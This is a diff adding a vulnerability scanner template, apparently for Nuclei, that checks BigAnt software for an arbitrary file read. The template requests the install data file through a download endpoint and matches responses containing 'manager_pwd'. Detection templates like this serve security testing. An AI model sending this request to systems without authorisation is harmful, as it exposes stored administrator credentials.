@@ -1,0 +1,27 @@
+id: BigAnt-download-ReadAnyFile
+
+info:
+  name: BigAnt-download-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    BigAnt-download-ReadAnyFile
+  tags: bigant
+http:
+  - raw:
+      - |
+        GET /Admin/Public/download.html?a=download&file=/Runtime/Data/installData.php&name=README.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'manager_pwd'
+          - 'company'
+        condition: and
+
+      - type: status
+        status:
+          - 200
